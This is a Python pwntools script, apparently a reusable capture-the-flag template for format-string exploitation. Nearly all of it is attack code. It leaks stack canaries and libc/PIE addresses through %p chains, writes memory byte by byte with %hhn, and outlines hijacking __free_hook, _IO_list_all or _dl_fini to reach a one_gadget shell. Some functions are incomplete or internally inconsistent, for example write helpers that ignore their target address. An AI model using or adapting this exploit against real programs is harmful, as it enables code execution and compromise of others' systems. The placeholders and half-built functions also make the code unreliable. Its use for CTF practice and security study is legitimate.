#!/usr/bin/env python3
"""
Advanced Multi-Stage Format String Exploit Template
Covers:
  - Stage 1: leak stack/PIE base/libc base/canary via %p chain
  - Stage 2: arbitrary write via %c%n or %hhn (byte-by-byte)
  - ret2linker: overwrite _dl_fini pointer to bypass PIE without .text leak
  - Blind write: write shellcode/one_gadget byte-by-byte to GOT/hook
  - __free_hook / __malloc_hook overwrite (glibc < 2.34)
  - _IO_file vtable overwrite (glibc 2.34+)

Usage: Copy, fill in TODO sections, adapt to your challenge.
"""
from pwn import *
import sys

# ── Target configuration ──────────────────────────────────────────────────────
BINARY  = "./fmt_challenge"   # TODO: path to binary
LIBC    = "./libc.so.6"       # TODO: path to libc
HOST    = "target.ctf.io"
PORT    = 1337

context.binary = elf = ELF(BINARY)
try:
    libc = ELF(LIBC)
except Exception:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "info"

# ── Stage 1: stack dump via %p chain ─────────────────────────────────────────

def leak_stack(io, n_ptrs: int = 30) -> list[int]:
    """
    Send a long %p chain and collect all leaked stack values.
    Returns list of integers (None for %p that printed '(nil)').
    """
    payload = b".".join(b"%p" for _ in range(n_ptrs))
    io.sendlineafter(b"> ", payload)  # TODO: adjust recv trigger
    response = io.recvline(timeout=5).strip()
    values = []
    for tok in response.split(b"."):
        tok = tok.strip()
        if tok == b"(nil)" or tok == b"0x0":
            values.append(None)
        else:
            try:
                values.append(int(tok, 16))
            except ValueError:
                values.append(None)
    return values


def find_interesting_leaks(stack_values: list[int]) -> dict[str, tuple[int, int]]:
    """
    Auto-classify leaked stack values by their likely provenance.
    Returns dict: {'pie_base': (offset, value), 'libc_base': ..., 'canary': ...}
    """
    results = {}
    pie_range   = (elf.address, elf.address + 0x100000)
    libc_range  = (libc.address, libc.address + 0x1000000)

    for i, v in enumerate(stack_values):
        if v is None:
            continue
        # Canary heuristic: ends in \x00, 7 non-null bytes
        if v & 0xff == 0x00 and v != 0 and (v >> 8) != 0:
            if "canary" not in results:
                results["canary"] = (i + 1, v)  # 1-indexed %N$p
        # PIE base: looks like a .text address (low 12 bits match a known function)
        if pie_range[0] <= v < pie_range[1]:
            if "pie_leak" not in results:
                results["pie_leak"] = (i + 1, v)
        # Libc address
        if libc_range[0] <= v < libc_range[1]:
            if "libc_leak" not in results:
                results["libc_leak"] = (i + 1, v)

    return results


# ── Stage 2: arbitrary write via format string ────────────────────────────────

def fmt_write_1byte(io, target_addr: int, value: int, fmt_offset: int,
                    stack_addr_offset: int) -> None:
    """
    Write a single byte `value & 0xff` to `target_addr` using %hhn.

    fmt_offset:       the %N$p position where the format string buffer itself
                      appears on the stack (find by placing unique marker and checking %p chain).
    stack_addr_offset: the %N$p position of a stack pointer that points near target_addr.
                      We overwrite this pointer first using a relative write.

    This is a two-phase %hhn write. For multi-byte targets, call repeatedly
    for each byte.
    """
    byte_val = value & 0xff
    # Build: %<byte_val>c%<fmt_offset>$hhn
    # This writes byte_val to the address at stack[fmt_offset]
    if byte_val == 0:
        payload = f"%{fmt_offset}$hhn".encode()
    else:
        payload = f"%{byte_val}c%{fmt_offset}$hhn".encode()
    io.sendlineafter(b"> ", payload)  # TODO: adjust
    log.debug(f"Wrote byte {byte_val:#04x} to {target_addr:#x}")


def fmt_write_qword(io, target_addr: int, value: int,
                    fmt_offset: int, addr_ptr_offsets: list[int]) -> None:
    """
    Write a full 64-bit value to target_addr using 8 sequential %hhn writes.
    addr_ptr_offsets: 8 stack positions (1-indexed) where we've planted
                      target_addr, target_addr+1, ..., target_addr+7.

    This method requires pre-planted addresses on the stack (e.g. in the argv/envp area
    or via multiple sends if the binary loops).
    """
    for i, (byte_offset, ptr_pos) in enumerate(zip(range(8), addr_ptr_offsets)):
        byte_val = (value >> (8 * i)) & 0xff
        if byte_val == 0:
            payload = f"%{ptr_pos}$hhn".encode()
        else:
            payload = f"%{byte_val}c%{ptr_pos}$hhn".encode()
        io.sendlineafter(b"> ", payload)
        log.debug(f"Wrote byte {i}: {byte_val:#04x}")


# ── ret2linker: overwrite _dl_fini in link_map to hijack exit() ──────────────

def ret2linker(libc_base: int, link_map_addr: int, one_gadget: int) -> None:
    """
    Overwrite _dl_fini → &one_gadget in link_map->l_info[0].
    When exit() is called, _IO_cleanup calls _dl_fini → our gadget.
    This bypasses PIE — we only need libc base, not .text base.

    link_map_addr: leaked from ld.so or calculated as libc.address + ld_offset.
    Typically: link_map = *((void**)libc_base + 0x219090)  (varies per libc version)
    """
    # _dl_fini is stored in link_map->l_info[DT_FINI] at offset 0x158 (varies)
    dl_fini_offset = 0x158  # TODO: adjust per ld.so version
    target_addr    = link_map_addr + dl_fini_offset
    log.info(f"ret2linker: overwriting _dl_fini @ {target_addr:#x} → {one_gadget:#x}")
    # Use fmt_write_qword or a direct write primitive to overwrite target_addr.


# ── Main exploit ──────────────────────────────────────────────────────────────

def main():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(elf.path, env={"LD_PRELOAD": LIBC} if LIBC else {})

    # ── Step 1: collect leaks ──────────────────────────────────────────────────
    log.info("Stage 1: leaking stack values via %p chain")
    stack_values = leak_stack(io, n_ptrs=40)
    log.info(f"Got {len(stack_values)} stack values")

    interesting = find_interesting_leaks(stack_values)
    log.info(f"Interesting leaks found: {list(interesting.keys())}")

    # Extract libc base
    if "libc_leak" not in interesting:
        log.warning("No libc leak found — try increasing n_ptrs or check offset manually")
        log.info("Dumped stack: " + " ".join(
            f"[{i+1}]={v:#x}" for i, v in enumerate(stack_values) if v
        ))
        return

    libc_idx, libc_leaked = interesting["libc_leak"]
    # Determine which libc symbol was leaked (e.g. __libc_start_main+243)
    # TODO: calculate libc_base:
    libc_base = libc_leaked - (libc.sym.get("__libc_start_main", 0) + 243)
    libc.address = libc_base
    log.success(f"libc base: {libc_base:#x}  (from %{libc_idx}$p)")

    # ── Step 2: find canary if present ────────────────────────────────────────
    canary = 0
    if "canary" in interesting:
        canary_idx, canary = interesting["canary"]
        log.success(f"Canary: {canary:#x}  (from %{canary_idx}$p)")

    # ── Step 3: overwrite target ───────────────────────────────────────────────
    # Choose target based on glibc version:
    glibc_minor = int(libc.path.split("2.")[-1].split(".")[0]) if "2." in libc.path else 35

    if glibc_minor < 34:
        # Overwrite __free_hook or __malloc_hook → one_gadget
        target  = libc.sym.get("__free_hook", libc.sym.get("__malloc_hook", 0))
        if not target:
            target = libc.address + 0x3ed8f0  # common 2.31 __free_hook offset
        gadget  = libc.address + 0xe3afe    # TODO: replace with actual one_gadget offset
        log.info(f"Overwriting __free_hook @ {target:#x} → {gadget:#x}")
    else:
        # glibc 2.34+: no hooks → overwrite _IO_list_all or use ret2linker
        target = libc.sym.get("_IO_list_all", libc.address + 0x1f9be0)
        gadget = libc.sym["system"]
        log.info(f"glibc 2.34+: using ret2linker / IO_FILE path")
        # Alternative: call ret2linker() above

    # TODO: use fmt_write_qword / fmt_write_1byte to overwrite target
    # Example (if you have a looping format vuln):
    # for i in range(8):
    #     fmt_write_1byte(io, target + i, (gadget >> (8*i)) & 0xff,
    #                     fmt_offset=<your_fmt_pos>, stack_addr_offset=<ptr_pos+i>)

    io.interactive()


if __name__ == "__main__":
    main()
